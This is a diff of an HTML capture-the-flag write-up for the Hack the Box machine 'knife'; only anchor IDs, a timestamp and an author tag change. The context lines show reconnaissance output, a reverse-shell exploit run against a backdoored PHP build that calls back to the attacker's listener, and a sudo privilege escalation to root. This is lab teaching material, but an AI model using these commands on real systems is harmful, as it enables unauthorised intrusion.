@@ -1,10 +1,11 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- 2022-04-15 Fri 15:51 -->
+<!-- 2022-07-25 Mon 19:29 -->
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>HTB | knife</title>
+<meta name="author" content="Main user for my machines" />
 <meta name="generator" content="Org Mode" />
 <link rel="stylesheet" type="text/css" href="static/style.css" />
 <script>
@@ -42,30 +43,30 @@
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#orgb5df3cb">1. Introduction</a></li>
-<li><a href="#org698bb0a">2. Recon</a>
+<li><a href="#org8b558c1">1. Introduction</a></li>
+<li><a href="#org76e628b">2. Recon</a>
 <ul>
-<li><a href="#org3ca4f67">2.1. Nmap all ports</a></li>
-<li><a href="#orgfb10083">2.2. Web enumeration</a>
+<li><a href="#org9a430df">2.1. Nmap all ports</a></li>
+<li><a href="#org6ff5916">2.2. Web enumeration</a>
 <ul>
-<li><a href="#orgc668221">2.2.1. Gobuster</a></li>
-<li><a href="#orgded9783">2.2.2. <code>/index.php</code></a></li>
+<li><a href="#orgda8dd53">2.2.1. Gobuster</a></li>
+<li><a href="#org00345c8">2.2.2. <code>/index.php</code></a></li>
 </ul>
 </li>
 </ul>
 </li>
-<li><a href="#org6ae3b39">3. Exploitation</a>
+<li><a href="#org0db23fe">3. Exploitation</a>
 <ul>
-<li><a href="#org805c013">3.1. Finding the vulnerability</a></li>
-<li><a href="#org5772ba3">3.2. Popping shell</a></li>
+<li><a href="#org09ac3ab">3.1. Finding the vulnerability</a></li>
+<li><a href="#org28f93c0">3.2. Popping shell</a></li>
 </ul>
 </li>
-<li><a href="#orgde74795">4. Priv-esc</a></li>
+<li><a href="#orgbbd2624">4. Priv-esc</a></li>
 </ul>
 </div>
 </nav>
-<div id="outline-container-orgb5df3cb" class="outline-2">
-<h2 id="orgb5df3cb"><span class="section-number-2">1.</span> Introduction</h2>
+<div id="outline-container-org8b558c1" class="outline-2">
+<h2 id="org8b558c1"><span class="section-number-2">1.</span> Introduction</h2>
 <div class="outline-text-2" id="text-1">
 <p>
 Welcome back to another write-up for another Hack the Box machine.<br>
@@ -75,21 +76,21 @@ This machine was running a webserver with an old PHP version on it, but we'll di
 </div>
 </div>
 
-<div id="outline-container-org698bb0a" class="outline-2">
-<h2 id="org698bb0a"><span class="section-number-2">2.</span> Recon</h2>
+<div id="outline-container-org76e628b" class="outline-2">
+<h2 id="org76e628b"><span class="section-number-2">2.</span> Recon</h2>
 <div class="outline-text-2" id="text-2">
 <p>
 First things first, let's get to know this machine a little better shall we?<br>
 We'll start by examining what services the machine has running.<br>
 </p>
 </div>
-<div id="outline-container-org3ca4f67" class="outline-3">
-<h3 id="org3ca4f67"><span class="section-number-3">2.1.</span> Nmap all ports</h3>
+<div id="outline-container-org9a430df" class="outline-3">
+<h3 id="org9a430df"><span class="section-number-3">2.1.</span> Nmap all ports</h3>
 <div class="outline-text-3" id="text-2-1">
 <p>
 Below we see the output from the <code>nmap</code> scan.<br>
 </p>
-<pre class="example" id="org4f1e60e">
+<pre class="example" id="orge15bba5">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/knife ]
 └─&gt; $ sudo nmap -sV -sC -p- -oA nmap/all_ports -iL target.txt          19:16
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-26 19:16 CEST
@@ -117,20 +118,20 @@ There is also an open <code>ssh</code> daemon running on port 22.<br>
 </div>
 </div>
 
-<div id="outline-container-orgfb10083" class="outline-3">
-<h3 id="orgfb10083"><span class="section-number-3">2.2.</span> Web enumeration</h3>
+<div id="outline-container-org6ff5916" class="outline-3">
+<h3 id="org6ff5916"><span class="section-number-3">2.2.</span> Web enumeration</h3>
 <div class="outline-text-3" id="text-2-2">
 <p>
 All right let us enumerate the webserver<br>
 </p>
 </div>
-<div id="outline-container-orgc668221" class="outline-4">
-<h4 id="orgc668221"><span class="section-number-4">2.2.1.</span> Gobuster</h4>
+<div id="outline-container-orgda8dd53" class="outline-4">
+<h4 id="orgda8dd53"><span class="section-number-4">2.2.1.</span> Gobuster</h4>
 <div class="outline-text-4" id="text-2-2-1">
 <p>
 <code>gobuster</code> didn't really give us anything of use other than <code>/index.php</code>.<br>
 </p>
-<pre class="example" id="org00271d4">
+<pre class="example" id="orga08420a">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/knife ]
 └─&gt; $ gobuster dir -u "http://10.129.180.32" -w ~/repositories/SecLists/Discovery/Web-Content/raft-small-words.txt -x php -d -b 404,403                                                                                                  19:21
 ===============================================================
@@ -157,14 +158,14 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
 </pre>
 </div>
 </div>
-<div id="outline-container-orgded9783" class="outline-4">
-<h4 id="orgded9783"><span class="section-number-4">2.2.2.</span> <code>/index.php</code></h4>
+<div id="outline-container-org00345c8" class="outline-4">
+<h4 id="org00345c8"><span class="section-number-4">2.2.2.</span> <code>/index.php</code></h4>
 <div class="outline-text-4" id="text-2-2-2">
 <p>
 If we open up the site with a browser connected to a proxy like <code>zap</code> or <code>burp</code>, and navigate to <code>/index.php</code>.<br>
 </p>
 
-<figure id="orgd38bae4">
+<figure id="orgbb80ab0">
 <img src="assets/2021-07-26_19-51-07_screenshot.png" alt="2021-07-26_19-51-07_screenshot.png"><br>
 
 <figcaption><span class="figure-number">Figure 1: </span>Rendered html of <code>/index.php</code></figcaption>
@@ -173,7 +174,7 @@ If we open up the site with a browser connected to a proxy like <code>zap</code>
 <p>
 The menu in the top right corner doesn't do anything, so let's take a look at the headers to see if there is anything useful.<br>
 </p>
-<pre class="example" id="org8e163c8">
+<pre class="example" id="org1271be5">
 HTTP/1.1 200 OK
 Date: Mon, 26 Jul 2021 17:20:52 GMT
 Server: Apache/2.4.41 (Ubuntu)
@@ -193,12 +194,12 @@ If you look at the <code>X-Powered-By:</code> header, we see that it's is runnin
 </div>
 </div>
 
-<div id="outline-container-org6ae3b39" class="outline-2">
-<h2 id="org6ae3b39"><span class="section-number-2">3.</span> Exploitation</h2>
+<div id="outline-container-org0db23fe" class="outline-2">
+<h2 id="org0db23fe"><span class="section-number-2">3.</span> Exploitation</h2>
 <div class="outline-text-2" id="text-3">
 </div>
-<div id="outline-container-org805c013" class="outline-3">
-<h3 id="org805c013"><span class="section-number-3">3.1.</span> Finding the vulnerability</h3>
+<div id="outline-container-org09ac3ab" class="outline-3">
+<h3 id="org09ac3ab"><span class="section-number-3">3.1.</span> Finding the vulnerability</h3>
 <div class="outline-text-3" id="text-3-1">
 <p>
 Now that we're done gathering all information possible about the target, mainly the version numbers of the softare running on the server.<br>
@@ -245,8 +246,8 @@ Which is then injected into the special header "User-Agentt", inside the parenth
 </p>
 </div>
 </div>
-<div id="outline-container-org5772ba3" class="outline-3">
-<h3 id="org5772ba3"><span class="section-number-3">3.2.</span> Popping shell</h3>
+<div id="outline-container-org28f93c0" class="outline-3">
+<h3 id="org28f93c0"><span class="section-number-3">3.2.</span> Popping shell</h3>
 <div class="outline-text-3" id="text-3-2">
 <p>
 First we setup a <code>netcat</code> listener on our machine:<br>
@@ -259,7 +260,7 @@ $ nc -nlvp 4444
 <p>
 Then we execute the revshell POC script with the right arguments:<br>
 </p>
-<pre class="example" id="org082f00d">
+<pre class="example" id="org004d013">
 ┌──[c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/knife/php-8.1.0-dev-backdoor-rce ]
 └─&gt; $ python revshell_php_8.1.0-dev.py "http://10.129.180.32" 10.10.14.87 4444                                   20:02
 </pre>
@@ -267,7 +268,7 @@ Then we execute the revshell POC script with the right arguments:<br>
 <p>
 And just like that we got a shell and user flag:<br>
 </p>
-<pre class="example" id="org9b1ec3e">
+<pre class="example" id="org450a7d1">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/knife ]
 └─&gt; $ nc -nlvp 4444                                                    19:56
 james@knife:/$ whoami
@@ -292,8 +293,8 @@ james@knife:~$
 </div>
 </div>
 
-<div id="outline-container-orgde74795" class="outline-2">
-<h2 id="orgde74795"><span class="section-number-2">4.</span> Priv-esc</h2>
+<div id="outline-container-orgbbd2624" class="outline-2">
+<h2 id="orgbbd2624"><span class="section-number-2">4.</span> Priv-esc</h2>
 <div class="outline-text-2" id="text-4">
 <p>
 Now that we got a shell, we must escalate our privileges to get <code>root</code>.<br>
@@ -316,7 +317,7 @@ $ sudo knife exec -E 'exec "/bin/sh"'
 <p>
 So let's run it and get our <code>root</code> flag:<br>
 </p>
-<pre class="example" id="org118e7d1">
+<pre class="example" id="org791af22">
 james@knife:/$ sudo knife exec -E 'exec "/bin/bash"'
 sudo knife exec -E 'exec "/bin/bash"'
 
